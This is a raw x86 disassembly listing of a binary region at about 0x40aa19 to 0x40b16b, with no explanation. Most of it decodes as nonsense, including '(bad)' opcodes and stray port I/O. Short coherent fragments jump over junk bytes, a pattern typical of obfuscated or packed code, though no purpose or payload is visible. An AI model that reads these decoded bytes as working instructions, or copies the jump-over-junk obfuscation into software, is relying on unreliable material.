  40aa19:	in     al,dx
  40aa1a:	xchg   edi,eax
  40aa1b:	mov    eax,ds:0xba4f2284
  40aa20:	in     al,0x2
  40aa22:	mov    ch,0x58
  40aa24:	out    dx,al
  40aa25:	(bad)  
  40aa26:	push   cs
  40aa27:	pushf  
  40aa28:	pop    edx
  40aa29:	pop    edx
  40aa2a:	push   edx
  40aa2b:	or     BYTE PTR [esi-0x462e26c5],bl
  40aa31:	sahf   
  40aa32:	outs   dx,DWORD PTR ds:[esi]
  40aa33:	(bad)  
  40aa34:	rol    BYTE PTR [esi+ebx*2-0x7fa69383],cl
  40aa3b:	dec    ecx
  40aa3c:	adc    BYTE PTR [ecx+0x75],dl
  40aa3f:	inc    esp
  40aa40:	loope  0x40aaa5
  40aa42:	xchg   esp,eax
  40aa43:	push   ss
  40aa44:	adc    DWORD PTR ds:0xdafa28ac,ebp
  40aa4a:	fadd   QWORD PTR [esi+0x67]
  40aa4d:	dec    eax
  40aa4e:	push   edx
  40aa4f:	iret   
  40aa50:	push   edi
  40aa51:	jb     0x40aa21
  40aa53:	inc    esi
  40aa54:	arpl   WORD PTR [eax],di
  40aa56:	and    esp,DWORD PTR [esi]
  40aa58:	imul   edi,DWORD PTR [edx*4-0xd78a01],0x75
  40aa60:	and    al,0xff
  40aa62:	jne    0x40aa84
  40aa64:	push   ecx
  40aa65:	push   edi
  40aa66:	call   0x41c901
  40aa6b:	jmp    0x40ab43
  40aa70:	ja     0x40aa87
  40aa72:	xor    bl,BYTE PTR [edi-0x200408e]
  40aa78:	ins    BYTE PTR es:[edi],dx
  40aa79:	cmp    al,0xf4
  40aa7b:	(bad)  
  40aa7c:	or     al,0x86
  40aa7e:	mov    BYTE PTR [edi+0x1c],bl
  40aa81:	ins    BYTE PTR es:[edi],dx
  40aa82:	add    BYTE PTR [eax],al
  40aa84:	mov    ebx,0x57000000
  40aa89:	aam    0x2e
  40aa8b:	test   eax,0xa5ad7d7f
  40aa90:	pop    ecx
  40aa91:	mov    edi,DWORD PTR [edx]
  40aa93:	and    bh,BYTE PTR [edx]
  40aa95:	loope  0x40aa49
  40aa97:	jge    0x40aa5b
  40aa99:	imul   ecx,DWORD PTR [eax+0x59],0x5
  40aa9d:	test   edx,ecx
  40aa9f:	hlt    
  40aaa0:	(bad)  
  40aaa1:	arpl   WORD PTR [ebp-0x72],cx
  40aaa4:	jge    0x40aa9a
  40aaa6:	xor    BYTE PTR [ebx+ecx*4],al
  40aaa9:	and    dl,al
  40aaab:	lock pop ecx
  40aaad:	jg     0x40aac2
  40aaaf:	leave  
  40aab0:	lahf   
  40aab1:	test   BYTE PTR [eax+0x39],al
  40aab4:	cwde   
  40aab5:	or     eax,0x60a49eb
  40aaba:	loopne 0x40aa6e
  40aabc:	cld    
  40aabd:	hlt    
  40aabe:	lds    esp,FWORD PTR [ebp+0xc]
  40aac1:	rol    BYTE PTR [ebp+edi*4+0x1c],cl
  40aac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aac6:	push   0x5600ed45
  40aacb:	add    al,0xb5
  40aacd:	push   ds
  40aace:	sbb    al,0x9b
  40aad0:	sbb    ebx,DWORD PTR [ecx+edi*8+0x5091acf0]
  40aad7:	sub    eax,0x819bb94b
  40aadc:	aas    
  40aadd:	(bad)  
  40aadf:	xchg   edi,eax
  40aae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aae1:	cmp    ebx,DWORD PTR [ecx-0x4420c0c2]
  40aae7:	adc    al,0xe4
  40aaea:	mov    BYTE PTR [edi],bl
  40aaec:	ins    DWORD PTR es:[edi],dx
  40aaed:	sbb    eax,0x8dc8f96
  40aaf2:	or     DWORD PTR [ecx],0xe3a2a09f
  40aaf8:	sbb    bl,bl
  40aafa:	aad    0x10
  40aafc:	jl     0x40aabb
  40aafe:	cld    
  40aaff:	xor    ecx,edi
  40ab01:	jmp    0xdc6f7849
  40ab06:	sbb    al,0x8a
  40ab08:	push   edx
  40ab09:	jb     0x40ab7b
  40ab0b:	pop    ecx
  40ab0c:	adc    BYTE PTR [esi+eax*4-0x30],ch
  40ab10:	dec    esi
  40ab11:	lods   al,BYTE PTR ds:[esi]
  40ab12:	pop    esp
  40ab13:	imul   esi,DWORD PTR [eax],0x41
  40ab16:	mov    cl,0x82
  40ab18:	imul   esp,edx,0x7c
  40ab1b:	pop    edi
  40ab1c:	mov    ebx,0xfe833e9b
  40ab21:	out    dx,al
  40ab22:	leave  
  40ab23:	fdiv   QWORD PTR [ebp+0x69]
  40ab26:	dec    edx
  40ab27:	lock jo 0x40ab15
  40ab2a:	pop    eax
  40ab2b:	inc    edi
  40ab2c:	xchg   edi,eax
  40ab2d:	out    0xc9,al
  40ab2f:	sub    edi,esp
  40ab31:	add    eax,0xbc4608a0
  40ab36:	pop    eax
  40ab37:	(bad)  
  40ab38:	call   0xd98d4c29
  40ab3d:	sbb    dl,BYTE PTR [ecx]
  40ab3f:	push   ss
  40ab40:	lea    edi,[edi+edi*1+0xd3e95e]
  40ab47:	add    BYTE PTR [eax],al
  40ab49:	jge    0x40aad5
  40ab4b:	fst    st(4)
  40ab4d:	call   edi
  40ab4f:	jge    0x40aafc
  40ab51:	jno    0x40ab04
  40ab53:	jbe    0x40ab8e
  40ab55:	data16 in al,dx
  40ab57:	mov    cl,0xbf
  40ab59:	xlat   BYTE PTR ds:[ebx]
  40ab5a:	ins    BYTE PTR es:[edi],dx
  40ab5b:	add    BYTE PTR [eax],al
  40ab5d:	mov    ebx,0xf7000000
  40ab62:	mov    DWORD PTR [edx+0x4077f1e0],esp
  40ab68:	imul   ecx,ebp,0x32
  40ab6b:	mov    ebp,0xb01e97d5
  40ab70:	jns    0x40abd1
  40ab72:	adc    ecx,DWORD PTR [edi]
  40ab74:	fucom  st(6)
  40ab76:	mov    eax,0x4526ef6f
  40ab7b:	mov    WORD PTR [esi+0x6b4caea2],es
  40ab81:	pop    ss
  40ab82:	xor    al,0x8c
  40ab84:	push   0x8
  40ab86:	jne    0x40abd5
  40ab88:	push   edi
  40ab89:	aaa    
  40ab8a:	cld    
  40ab8b:	jmp    0x40ab43
  40ab8d:	push   ds
  40ab8e:	xlat   BYTE PTR ds:[ebx]
  40ab8f:	ins    BYTE PTR es:[edi],dx
  40ab90:	enter  0xd4a8,0x3c
  40ab94:	icebp  
  40ab95:	fisubr WORD PTR ds:0x1d995960
  40ab9b:	addr16 pusha 
  40ab9d:	das    
  40ab9e:	call   0xf57ba747
  40aba3:	(bad)  
  40aba4:	jb     0x40ab55
  40aba6:	bound  dx,DWORD PTR [ebx+0x397f219c]
  40abad:	gs sbb al,0x67
  40abb0:	and    esi,DWORD PTR [eax+0x44]
  40abb3:	cld    
  40abb4:	call   0xb9d0eb42
  40abb9:	aas    
  40abba:	gs or  ebx,edx
  40abbd:	cmp    BYTE PTR [ecx+edx*8-0x6121926d],ah
  40abc4:	or     al,0x79
  40abc6:	in     al,dx
  40abc7:	inc    edx
  40abc8:	inc    edi
  40abc9:	dec    ecx
  40abca:	sbb    ecx,DWORD PTR [bp+di-0x49]
  40abce:	sub    DWORD PTR [ebx-0x746c876d],edx
  40abd4:	dec    edx
  40abd5:	clc    
  40abd6:	mov    DWORD PTR [ebp-0x20],edx
  40abd9:	(bad)  
  40abda:	cmp    DWORD PTR [ecx],esi
  40abdc:	fsubr  QWORD PTR [edi-0x7322a317]
  40abe2:	mov    ebx,0xaa0152d
  40abe7:	cmp    BYTE PTR [edx-0x9],ch
  40abea:	ret    
  40abeb:	mov    eax,0xe937f8a8
  40abf0:	push   cs
  40abf1:	(bad)  
  40abf2:	ror    edx,1
  40abf4:	data16 sub ah,BYTE PTR ds:0x336a6228
  40abfb:	dec    ebx
  40abfc:	addr16 mov ebx,0x62aad084
  40ac02:	pusha  
  40ac03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac04:	or     al,0xa1
  40ac06:	push   eax
  40ac07:	jb     0x40ac39
  40ac09:	or     eax,0x8a3f3fd2
  40ac0e:	ret    0xa898
  40ac11:	or     DWORD PTR ds:0x2fc1cfe,ebx
  40ac17:	cmp    BYTE PTR [ecx+0x4a],dl
  40ac1a:	xor    eax,0xc2c95bdb
  40ac1f:	and    al,0x0
  40ac21:	push   ebp
  40ac22:	mov    ebp,esp
  40ac24:	sub    esp,0x34
  40ac27:	push   esi
  40ac28:	jmp    0x40acea
  40ac2d:	or     DWORD PTR [eax],0xffffff89
  40ac30:	iret   
  40ac31:	mov    ecx,edi
  40ac33:	(bad)  
  40ac34:	dec    esp
  40ac35:	sub    eax,0x4fc35b2e
  40ac3a:	sub    eax,0x6d929f5f
  40ac3f:	add    BYTE PTR [eax],al
  40ac41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac42:	add    BYTE PTR [eax],al
  40ac44:	add    BYTE PTR [edx],al
  40ac46:	iret   
  40ac47:	clc    
  40ac48:	outs   dx,DWORD PTR ds:[esi]
  40ac49:	in     eax,dx
  40ac4a:	mov    dh,0xf3
  40ac4c:	mov    dl,0x6a
  40ac4e:	jne    0x40acc7
  40ac50:	repnz push esi
  40ac52:	adc    edi,esp
  40ac54:	adc    eax,0x459248f5
  40ac59:	outs   dx,BYTE PTR ds:[esi]
  40ac5a:	push   cs
  40ac5b:	sub    ah,BYTE PTR [esi-0x2b036e17]
  40ac61:	xor    eax,0xa47d2667
  40ac66:	leave  
  40ac67:	xchg   edi,eax
  40ac68:	dec    esi
  40ac69:	test   DWORD PTR [edi+eiz*2],eax
  40ac6c:	xchg   ecx,eax
  40ac6d:	add    DWORD PTR [ebx+0x63],0x2d
  40ac71:	pop    ebx
  40ac72:	mov    ebx,0xf774089e
  40ac77:	cli    
  40ac78:	stc    
  40ac79:	imul   ebp,DWORD PTR [ebx],0x5c
  40ac7c:	popa   
  40ac7d:	sub    eax,0x70c07217
  40ac82:	jmp    0x40ac82
  40ac84:	mov    ss,esi
  40ac86:	pushf  
  40ac87:	test   DWORD PTR [edi],eax
  40ac89:	shl    ch,1
  40ac8b:	inc    edx
  40ac8c:	idiv   BYTE PTR [ebx]
  40ac8e:	fidiv  DWORD PTR [esi+0x0]
  40ac91:	dec    esp
  40ac92:	ja     0x40ac60
  40ac94:	push   es
  40ac95:	loope  0x40acfd
  40ac97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac98:	push   0x5f
  40ac9a:	jmp    0x9dbddc33
  40ac9f:	jo     0x40ac88
  40aca1:	add    BYTE PTR [ebx-0x4b55096e],ah
  40aca7:	cmp    ebp,esi
  40aca9:	xchg   edi,eax
  40acaa:	in     al,dx
  40acab:	pop    eax
  40acac:	mov    gs,WORD PTR [ebp-0x75]
  40acaf:	clc    
  40acb0:	call   0xb792bb54
  40acb5:	or     al,0x18
  40acb7:	push   ebx
  40acb8:	adc    bh,BYTE PTR [ecx]
  40acba:	lahf   
  40acbb:	add    BYTE PTR [esi-0x5f4cdaf],bl
  40acc1:	mov    ebp,0x4a9591fb
  40acc6:	stc    
  40acc7:	pop    edx
  40acc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acc9:	sub    BYTE PTR [ebx+eiz*8+0x5fe545f2],bh
  40acd0:	cmp    al,0x27
  40acd2:	and    DWORD PTR [ecx-0x972782],ebp
  40acd8:	cld    
  40acd9:	retf   0x96fa
  40acdc:	xchg   ebp,eax
  40acdd:	int3   
  40acde:	shl    DWORD PTR [ebp-0x6f6bedfa],1
  40ace4:	mov    eax,ds:0xffcb2c4c
  40ace9:	sub    edi,eax
  40aceb:	inc    ebp
  40acec:	cld    
  40aced:	sbb    bl,BYTE PTR [edx]
  40acef:	add    BYTE PTR [eax],al
  40acf1:	jmp    0x40adb3
  40acf6:	xchg   ebp,eax
  40acf7:	ror    DWORD PTR [ecx],1
  40acf9:	inc    ebp
  40acfa:	dec    ebp
  40acfb:	fstp   st(5)
  40acfd:	sar    DWORD PTR [ebp+0x2f],1
  40ad00:	(bad)
  40ad04:	ret    0x37a1
  40ad07:	outs   dx,BYTE PTR ds:[esi]
  40ad08:	add    BYTE PTR [eax],al
  40ad0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad0b:	add    BYTE PTR [eax],al
  40ad0d:	add    BYTE PTR [edi+0x62],ch
  40ad10:	push   edx
  40ad11:	mov    ebp,0x463559e
  40ad16:	outs   dx,DWORD PTR ds:[esi]
  40ad17:	mov    esi,edx
  40ad19:	sub    BYTE PTR [ecx-0x53],0x32
  40ad1d:	and    DWORD PTR [edx+ecx*8],edx
  40ad20:	or     al,0x28
  40ad22:	jnp    0x40acf2
  40ad24:	scas   eax,DWORD PTR es:[edi]
  40ad25:	pop    ds
  40ad26:	adc    BYTE PTR [esi+edx*8+0x4d688888],cl
  40ad2d:	cli    
  40ad2e:	loopne 0x40ad6d
  40ad30:	sbb    eax,0x35c0d1a4
  40ad35:	xchg   edi,eax
  40ad36:	mov    al,ds:0xa2f1fec0
  40ad3b:	mov    ch,0x3c
  40ad3d:	cli    
  40ad3e:	pop    ebp
  40ad3f:	sub    DWORD PTR [edi+0x4a023d6d],ebx
  40ad45:	das    
  40ad46:	jb     0x40adb2
  40ad48:	xor    BYTE PTR [esp+esi*4-0x52],0xec
  40ad4d:	mov    dl,0xf5
  40ad4f:	lahf   
  40ad50:	sub    eax,0x4b30b034
  40ad55:	add    eax,0x3b118d2d
  40ad5a:	fstp   TBYTE PTR [ebp+ebx*4+0x7285a5a9]
  40ad61:	pop    esi
  40ad62:	cwde   
  40ad63:	jo     0x40adc5
  40ad65:	std    
  40ad66:	or     eax,0x2ad0aae6
  40ad6b:	mov    cl,0xfe
  40ad6d:	dec    edx
  40ad6e:	add    eax,0xa502048d
  40ad73:	jno    0x40ad95
  40ad75:	push   ss
  40ad76:	or     BYTE PTR [edi],cl
  40ad78:	push   esi
  40ad79:	add    al,0x8e
  40ad7b:	or     al,0x11
  40ad7d:	xchg   edx,eax
  40ad7e:	and    BYTE PTR [ebx+0x61],cl
  40ad81:	cmp    al,0x3e
  40ad83:	cdq    
  40ad84:	add    al,0xba
  40ad86:	cld    
  40ad87:	ja     0x40ad5f
  40ad89:	mov    ebx,0x2632f4ee
  40ad8e:	mov    BYTE PTR [edi],al
  40ad90:	sub    DWORD PTR [edx+0x124e1036],ebx
  40ad96:	das    
  40ad97:	cmp    eax,0xd4d1acfb
  40ad9c:	pop    eax
  40ad9d:	std    
  40ad9e:	(bad)  
  40ad9f:	test   DWORD PTR [ecx+edx*2],ebx
  40ada2:	pop    ecx
  40ada3:	or     edi,DWORD PTR [eax+0x13]
  40ada6:	sbb    bh,ch
  40ada8:	mov    ecx,0x4bcf2cb8
  40adad:	push   ebx
  40adae:	(bad)  
  40adaf:	jns    0x40ad89
  40adb1:	sub    bh,0xc7
  40adb4:	inc    ebp
  40adb5:	fsubr  QWORD PTR [edi]
  40adb7:	pop    ds
  40adb8:	add    BYTE PTR [eax],al
  40adba:	jmp    0x40ae7c
  40adbf:	jg     0x40ad45
  40adc1:	sbb    BYTE PTR [edi-0x5],dh
  40adc4:	(bad)  
  40adc5:	jg     0x40ad53
  40adc7:	jmp    DWORD PTR [edx+edx*2]
  40adca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adcb:	shl    BYTE PTR [edi+0x6edc0d02],0x0
  40add2:	add    BYTE PTR [ebp+0x77000000],ah
  40add8:	pop    ds
  40add9:	mov    ebp,0xffed721c
  40adde:	mov    bh,0x83
  40ade0:	xchg   BYTE PTR [eax+0x2ad80334],dh
  40ade6:	mov    BYTE PTR [ebx+0x79ec516b],dh
  40adec:	mov    bh,0xc7
  40adee:	test   dh,bl
  40adf0:	pusha  
  40adf1:	imul   ebx,DWORD PTR [edx-0x75],0xffffffa5
  40adf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adf6:	jl     0x40ad82
  40adf8:	frstor [esi-0x35]
  40adfb:	sahf   
  40adfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adfd:	or     DWORD PTR [esi-0x2d56284c],0x2b
  40ae04:	inc    esp
  40ae05:	mov    bh,0x88
  40ae07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae08:	add    eax,0xee54b809
  40ae0d:	pop    es
  40ae0e:	daa    
  40ae0f:	push   edi
  40ae10:	adc    DWORD PTR [eax+0x3a],esi
  40ae13:	jne    0x40addb
  40ae15:	int3   
  40ae16:	in     eax,dx
  40ae17:	dec    ecx
  40ae18:	pop    ebx
  40ae19:	jnp    0x40ae5b
  40ae1b:	or     DWORD PTR [eax+0x553bc65e],esi
  40ae21:	retf   
  40ae22:	mov    ds:0x5dc99e19,al
  40ae27:	lock in eax,0xa1
  40ae2a:	popf   
  40ae2b:	xor    al,0x64
  40ae2d:	mov    eax,ds:0x283dfa34
  40ae32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae33:	mov    ecx,0xad63f286
  40ae38:	and    dl,bl
  40ae3a:	cld    
  40ae3b:	cs mov ebx,0x69421e99
  40ae41:	jp     0x40ae74
  40ae43:	xchg   ecx,eax
  40ae44:	mov    edi,0x879dfbfc
  40ae49:	sbb    esp,DWORD PTR [esi+0xa]
  40ae4c:	jle    0x40ae01
  40ae4e:	stc    
  40ae4f:	mov    bh,0xc3
  40ae51:	retf   
  40ae52:	pop    eax
  40ae53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae54:	jne    0x40ae90
  40ae56:	jle    0x40adde
  40ae58:	xlat   BYTE PTR ds:[ebx]
  40ae59:	inc    ecx
  40ae5a:	xchg   ebp,eax
  40ae5b:	xor    al,0x6d
  40ae5d:	adc    bl,bh
  40ae5f:	iret   
  40ae60:	add    DWORD PTR [ecx],0xffffff8e
  40ae63:	mov    edi,0xffe9bc7b
  40ae68:	pushf  
  40ae69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae6a:	jnp    0x40ae79
  40ae6c:	sbb    DWORD PTR [esi+0x75],ecx
  40ae6f:	mov    al,ds:0xdc5b1e70
  40ae74:	inc    esi
  40ae75:	jae    0x40aeb0
  40ae77:	ret    0xf2ad
  40ae7a:	mov    edx,ebp
  40ae7c:	xor    esi,esi
  40ae7e:	mov    DWORD PTR [ebp-0x20],0xce5
  40ae85:	inc    esi
  40ae86:	jmp    0x40af48
  40ae8b:	cmp    BYTE PTR [ecx],ch
  40ae8d:	outs   dx,DWORD PTR ds:[esi]
  40ae8e:	(bad)  
  40ae8f:	jg     0x40ae57
  40ae91:	mov    ecx,0x54e4bcff
  40ae96:	pop    edi
  40ae97:	xchg   ecx,eax
  40ae98:	xlat   BYTE PTR ds:[ebx]
  40ae99:	fldenv [edi-0x7f]
  40ae9c:	outs   dx,DWORD PTR ds:[esi]
  40ae9d:	add    BYTE PTR [eax],al
  40ae9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aea0:	add    BYTE PTR [eax],al
  40aea2:	add    BYTE PTR [edx+0x2e],al
  40aea5:	pop    es
  40aea6:	add    al,0x94
  40aea8:	mov    dh,bh
  40aeaa:	pop    ecx
  40aeab:	add    esp,DWORD PTR [edi]
  40aead:	daa    
  40aeae:	sar    BYTE PTR [edx+0x37],1
  40aeb1:	inc    eax
  40aeb2:	push   0xffffffac
  40aeb4:	adc    al,0xa5
  40aeb6:	pop    ebp
  40aeb7:	adc    DWORD PTR [edi],ebx
  40aeb9:	ror    BYTE PTR [edi],1
  40aebb:	dec    eax
  40aebc:	pop    edi
  40aebd:	add    al,0x78
  40aebf:	xor    al,0x3d
  40aec1:	test   BYTE PTR [edx+esi*4+0x63c60a01],ah
  40aec8:	imul   edx,DWORD PTR ds:0x94b2e7cb,0x1480bf12
  40aed2:	mov    esp,0x81410696
  40aed7:	push   ebx
  40aed8:	xchg   ebp,eax
  40aed9:	push   ds
  40aeda:	bound  esp,QWORD PTR [ecx+0x42]
  40aedd:	lea    eax,[eax+0x6f]
  40aee0:	xchg   esp,eax
  40aee1:	lds    esp,FWORD PTR [esi-0x79714609]
  40aee7:	(bad)  
  40aee8:	push   ecx
  40aee9:	add    dh,BYTE PTR [ebp+0x48eeedca]
  40aeef:	jo     0x40aeb8
  40aef1:	in     eax,0xa3
  40aef3:	jge    0x571b98d5
  40aef9:	mov    ?,WORD PTR [ebx+ebx*2]
  40aefc:	shr    DWORD PTR [edx*2+0x3f489bac],cl
  40af03:	rcl    BYTE PTR [ecx-0x2f],0x81
  40af07:	aad    0x6b
  40af09:	mov    ah,0x49
  40af0b:	out    dx,eax
  40af0c:	cmp    eax,0x4719c836
  40af11:	daa    
  40af12:	jno    0x40af33
  40af14:	mov    bh,0x37
  40af16:	mov    al,cl
  40af18:	fstp   TBYTE PTR [ecx]
  40af1a:	jno    0x40af92
  40af1c:	cmp    ebx,DWORD PTR [ebx]
  40af1e:	adc    bl,bl
  40af20:	dec    edx
  40af21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af22:	xor    edi,edi
  40af24:	popa   
  40af25:	test   al,0x16
  40af27:	cdq    
  40af28:	sub    DWORD PTR [ebp+0x8],0xffffffd7
  40af2c:	add    BYTE PTR [esi-0x124daaf8],ah
  40af32:	das    
  40af33:	inc    edx
  40af34:	and    DWORD PTR [eax-0x7],0xf7c0e183
  40af3b:	xor    BYTE PTR [edi],al
  40af3d:	add    BYTE PTR [edi+edx*8+0x7f734a32],dl
  40af44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af45:	push   es
  40af46:	mov    ebx,0xe4758907
  40af4b:	mov    DWORD PTR [ebp-0x18],0x1382
  40af52:	jmp    0x40b014
  40af57:	pop    edi
  40af58:	inc    ecx
  40af59:	pusha  
  40af5a:	xor    bh,BYTE PTR [esi+0x33]
  40af5d:	pop    edi
  40af5e:	ins    DWORD PTR es:[edi],dx
  40af5f:	das    
  40af60:	lock dec ecx
  40af62:	je     0x40afda
  40af64:	jne    0x40afb4
  40af66:	mov    eax,ds:0x7026
  40af6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af6c:	add    BYTE PTR [eax],al
  40af6e:	add    BYTE PTR [esi],al
  40af70:	mov    es,ecx
  40af72:	scas   al,BYTE PTR es:[edi]
  40af73:	mov    ch,BYTE PTR ds:0xbfc29ba
  40af79:	dec    edi
  40af7a:	sar    BYTE PTR [ebx+0x52],cl
  40af7d:	dec    esp
  40af7e:	int    0xc2
  40af80:	or     eax,0x62eb4f80
  40af85:	in     eax,dx
  40af86:	add    bh,BYTE PTR [edx]
  40af88:	aad    0x9a
  40af8a:	cdq    
  40af8b:	mov    cl,0x83
  40af8d:	or     DWORD PTR [ecx-0x36],ebx
  40af90:	xor    eax,0xa4212657
  40af95:	fstp   QWORD PTR [esi]
  40af97:	push   0xd9d9c2c3
  40af9c:	imul   ecx,DWORD PTR [esi],0xffffff89
  40af9f:	add    BYTE PTR [edx+0x11],dl
  40afa2:	ret    0x1621
  40afa5:	inc    ebx
  40afa6:	retf   
  40afa7:	or     DWORD PTR [edx-0x1e],ebp
  40afaa:	cmp    DWORD PTR [edx+edi*8-0x10],0xffffffd3
  40afaf:	jg     0x40b005
  40afb1:	add    al,0x10
  40afb3:	fdivr  QWORD PTR [eax-0x49]
  40afb6:	pushf  
  40afb7:	movlps QWORD PTR [edx],xmm7
  40afba:	mov    dh,0x30
  40afbc:	lea    edi,[ebp-0x42e3fa0a]
  40afc2:	stos   DWORD PTR es:[edi],eax
  40afc3:	push   0x790fe1af
  40afc8:	(bad)  [esi]
  40afca:	jmp    0x5875:0x1607a216
  40afd1:	xchg   edi,eax
  40afd2:	pop    ss
  40afd3:	and    edi,DWORD PTR [ecx+0x5f]
  40afd6:	std    
  40afd7:	sti    
  40afd8:	test   BYTE PTR [ebp-0x1e],0x66
  40afdc:	mov    bl,al
  40afde:	ret    
  40afdf:	fs das 
  40afe1:	sti    
  40afe2:	or     BYTE PTR [eax+ecx*4],0x72
  40afe6:	add    al,0xf0
  40afe8:	dec    ebx
  40afe9:	jmp    0xbaf9:0x44230dd1
  40aff0:	loop   0x40b060
  40aff2:	sbb    BYTE PTR [edx+ebp*4],dl
  40aff5:	pop    esi
  40aff6:	or     esi,DWORD PTR [ecx]
  40aff8:	or     eax,0xf9536216
  40affd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40affe:	stos   DWORD PTR es:[edi],eax
  40afff:	mov    cl,0x1d
  40b001:	js     0x40af95
  40b003:	adc    ecx,ecx
  40b005:	in     eax,0xa5
  40b007:	xor    edx,ebp
  40b009:	cld    
  40b00a:	xchg   esi,eax
  40b00b:	jb     0x40afa1
  40b00d:	xor    ecx,esp
  40b00f:	and    al,0x32
  40b011:	mov    WORD PTR [ebx-0x13ba38f3],fs
  40b017:	or     al,0x0
  40b019:	add    BYTE PTR [eax],al
  40b01b:	mov    ecx,DWORD PTR [ebp-0x4]
  40b01e:	and    ecx,0x4670
  40b024:	sub    ecx,0x4870
  40b02a:	push   ebx
  40b02b:	xor    ecx,0xffffa782
  40b031:	push   edi
  40b032:	xor    edx,edx
  40b034:	mov    DWORD PTR [ebp-0x8],0x12f9
  40b03b:	mov    DWORD PTR [ebp-0x4],0x6d09
  40b042:	jmp    0x40b104
  40b047:	push   ebx
  40b048:	in     eax,0x81
  40b04a:	fnsave [edi+0x56ef5ffd]
  40b050:	mov    ecx,0x256d7078
  40b055:	and    BYTE PTR [edi+0x70cb],bh
  40b05b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b05c:	add    BYTE PTR [eax],al
  40b05e:	add    ah,ch
  40b060:	dec    ebx
  40b061:	loop   0x40b060
  40b063:	mov    edx,DWORD PTR [eax+0x286e6ffa]
  40b069:	xchg   esi,eax
  40b06a:	es add edx,ebp
  40b06d:	rcl    DWORD PTR [ecx-0x74474738],0x7e
  40b074:	out    0x16,al
  40b076:	hlt    
  40b077:	test   al,0xe5
  40b079:	ss jp  0x40b0a7
  40b07c:	repnz xchg ecx,eax
  40b07e:	add    eax,0x9f6adab
  40b083:	scas   al,BYTE PTR es:[edi]
  40b084:	dec    esi
  40b085:	inc    eax
  40b086:	or     bh,0x7
  40b089:	mov    DWORD PTR [edx-0x4d],eax
  40b08c:	push   ebx
  40b08d:	jg     0x40b07d
  40b08f:	xchg   BYTE PTR [ebp-0x40],bh
  40b092:	inc    edx
  40b093:	jecxz  0x40b0da
  40b095:	mov    esp,0x28659ee1
  40b09a:	jmp    0x65b7f40f
  40b09f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0a0:	or     al,0x9b
  40b0a2:	jmp    0xde76e03e
  40b0a7:	push   0x6e
  40b0a9:	nop
  40b0aa:	adc    esp,ebx
  40b0ac:	leave  
  40b0ad:	push   ds
  40b0ae:	cld    
  40b0af:	mov    edx,0xedda310e
  40b0b4:	in     eax,0x32
  40b0b6:	mov    ecx,0x5b8c7c89
  40b0bb:	hlt    
  40b0bc:	xchg   edi,eax
  40b0bd:	sar    DWORD PTR [esi+0x75874efc],cl
  40b0c3:	jne    0x40b0a6
  40b0c5:	jae    0x40b0c2
  40b0c7:	xchg   esp,eax
  40b0c8:	aad    0x1c
  40b0ca:	xchg   ebx,eax
  40b0cb:	hlt    
  40b0cc:	pop    ebx
  40b0cd:	nop
  40b0ce:	jmp    FWORD PTR [eax+0x574ef8ef]
  40b0d4:	cmp    BYTE PTR [esi],0x39
  40b0d7:	(bad)
  40b0dc:	xchg   ebx,eax
  40b0dd:	jl     0x40b099
  40b0df:	add    edi,DWORD PTR [ebx-0x27]
  40b0e2:	cwde   
  40b0e3:	out    dx,eax
  40b0e4:	mov    esp,0x83321c57
  40b0e9:	fwait
  40b0ea:	ret    0x86bc
  40b0ed:	xchg   ebx,eax
  40b0ee:	test   DWORD PTR [ebx],ebp
  40b0f0:	mov    edx,DWORD PTR [ecx+0x2e09597c]
  40b0f6:	ror    bl,0xff
  40b0f9:	scas   al,BYTE PTR es:[edi]
  40b0fa:	loop   0x40b0bb
  40b0fc:	push   ss
  40b0fd:	pop    ecx
  40b0fe:	js     0x40b0bf
  40b100:	icebp  
  40b101:	cld    
  40b102:	(bad)
  40b105:	inc    ebp
  40b106:	lock xchg ebp,eax
  40b108:	imul   eax,DWORD PTR [eax],0x0
  40b10b:	mov    DWORD PTR [ebp-0xc],0x5d36
  40b112:	jmp    0x40b1d4
  40b117:	sbb    dl,BYTE PTR ds:0xacbf88b9
  40b11d:	cmp    edx,DWORD PTR [edi-0x60b8e655]
  40b123:	les    eax,FWORD PTR [esi-0x6d]
  40b126:	mov    eax,ds:0x7170
  40b12b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b12c:	add    BYTE PTR [eax],al
  40b12e:	add    al,cl
  40b130:	sub    bh,dl
  40b132:	stc    
  40b133:	mov    ch,0xa3
  40b135:	sbb    BYTE PTR [ecx+0x7f],ch
  40b138:	sbb    DWORD PTR [ebx-0x4d],ebx
  40b13b:	cli    
  40b13c:	xor    eax,0x8f615fdd
  40b141:	xor    al,0xa5
  40b143:	mov    esi,0x43b4c561
  40b148:	sub    BYTE PTR [ecx-0x77],bl
  40b14b:	and    DWORD PTR [ebx-0x1a],0x22
  40b14f:	popa   
  40b150:	or     eax,0xbc6d7f4d
  40b155:	xchg   edx,eax
  40b156:	push   0xfca36921
  40b15b:	pusha  
  40b15c:	rcl    eax,1
  40b15e:	xor    edi,DWORD PTR [edx]
  40b160:	stos   BYTE PTR es:[edi],al
  40b161:	cld    
  40b162:	jbe    0x40b19c
  40b164:	out    0xe4,eax
  40b166:	jno    0x40b135
  40b168:	pop    edi
  40b169:	mov    dh,0x6f
  40b16b:	xchg   edi,eax
